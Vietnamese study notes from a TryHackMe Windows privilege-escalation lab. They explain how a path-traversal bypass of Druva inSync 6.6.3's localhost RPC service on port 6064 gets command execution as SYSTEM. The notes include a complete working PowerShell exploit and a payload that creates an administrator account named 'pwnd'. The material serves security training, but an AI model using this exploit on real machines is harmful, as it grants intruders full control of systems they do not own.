Druva inSync 6.6.3 bị khai thác do lỗi trong bản vá bảo mật của phiên bản trước. Lỗ hổng này liên quan đến máy chủ RPC (Remote Procedure Call) chạy trên cổng 6064, hoạt động với đặc quyền HỆ THỐNG nhưng chỉ chấp nhận kết nối từ localhost.

Cách khai thác

- RPC cho phép thực thi lệnh từ xa, và quy trình số 5 trên cổng 6064 chấp nhận bất kỳ lệnh nào.
- Ban đầu, không có kiểm tra giới hạn, dẫn đến việc thực thi lệnh không kiểm soát.
- Bản vá sau đó chỉ kiểm tra xem lệnh có bắt đầu bằng thư mục hợp lệ (C:\ProgramData\Druva\inSync4\) hay không.

Bypass bản vá

Kẻ tấn công có thể sử dụng Path Traversal để bỏ qua kiểm tra. Ví dụ, để chạy cmd.exe, có thể sử dụng đường dẫn:

    C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe

Điều này vượt qua kiểm tra nhưng vẫn thực thi được lệnh với quyền SYSTEM.

Mã khai thác: 

    $ErrorActionPreference = "Stop"

    $cmd = "net user pwnd /add"

    $s = New-Object System.Net.Sockets.Socket(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Stream,
        [System.Net.Sockets.ProtocolType]::Tcp
    )
    $s.Connect("127.0.0.1", 6064)

    $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
    $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
    $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
    $length = [System.BitConverter]::GetBytes($command.Length);

    $s.Send($header)
    $s.Send($rpcType)
    $s.Send($length)
    $s.Send($command)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image235.png?raw=true)

Có thể mở bảng điều khiển Powershell và dán trực tiếp phần khai thác để thực thi nó

Payload mặc định của kẻ khai thác, được chỉ định trong biến $cmd, sẽ tạo một người dùng có tên pwnd trong hệ thống, nhưng sẽ không gán cho anh ta đặc quyền quản trị, vì vậy thay đổi payload để có thứ gì đó hữu ích hơn. Thay đổi payload để chạy lệnh sau:

    net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image236.png?raw=true)

=> Chạy code: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image237.png?raw=true)

Thao tác này sẽ tạo pwnd người dùng bằng mật khẩu SimplePass123 và thêm nó vào nhóm quản trị viên. Nếu việc khai thác thành công, có thể chạy lệnh sau để xác minh rằng người dùng pwnd tồn tại và là một phần của nhóm quản trị viên:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image238.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image239.png?raw=true)

=> Chạy cmd với tư cách Administartor

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image240.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image241.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image242.png?raw=true)

**Task 8: Tools of the Trade**

WinPEAS

PrivescCheck

WES-NG: Windows Exploit Suggester - Next Generation

Metasploit

**Task 9: Conclusion**



